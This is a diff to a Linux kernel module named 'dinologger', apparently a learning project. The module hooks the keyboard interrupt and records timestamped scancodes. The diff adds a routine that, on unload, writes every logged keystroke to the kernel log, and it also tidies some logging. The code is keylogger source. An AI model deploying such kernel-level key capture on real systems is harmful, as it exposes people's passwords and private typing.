@@ -28,6 +28,8 @@ static const struct seq_operations seq_ops = {
 static log_node *lst_new(struct rtc_time *_time, int _scancode, int _release) {
 	log_node *new;
 	new = kmalloc(sizeof(log_node), GFP_KERNEL);
+	if (!new)
+		return NULL;
 
 	new->time = *_time;
 	new->scancode = _scancode;
@@ -49,18 +51,25 @@ static void log_stats(void) {
 	}
 	if (sum > 0) {
 		int ratio = (stats[max]*100)/sum;
-		LOG("you pressed %d keys", sum);
-		LOG("most pressed key is '%s': %d times (%d%%) !",
-				kbus[max], stats[max], ratio);
+		LOG("you pressed %d keys, most pressed is '%s': %d times (%d%%) !",
+				sum, kbus[max], stats[max], ratio);
 	} else {
 		LOG("you pressed no keys :(");
 	}
 }
 
-static void free_file(void) {
+static void trace_back(void) {
+	TRACE_BACK("dinologger: ");
 	log_node *pos;
 	log_node *tmp;
+
 	list_for_each_entry_safe(pos, tmp, &file_list, list) {
+		if (!pos->release) {
+			if (SPECIAL(pos->scancode))
+				TRACE_BACK("[%s]", NAME(pos->scancode));
+			else
+				TRACE_BACK("%s", NAME(pos->scancode));
+		}
 		kfree(pos);
 	}
 }
@@ -102,12 +111,10 @@ static int register_device(void) {
 		LOG("failed to register - error code: %d", res);
 		return res;
 	}
-	LOG("registered device");
 	return 0;
 }
 
 static void unregister_device(void) {
-	LOG("unregistering");
 	misc_deregister(&misc);
 }
 
@@ -154,10 +161,11 @@ int __init m_init(void) {
 
 void __exit m_exit(void) {
 	exiting = 1;
+	LOG("unloading module, displaying trace back...");
 
 	unregister_device();
+	trace_back();
 	log_stats();
-	free_file();
 	free_irq(1, (void *)irq_handler);
 	return;
 }
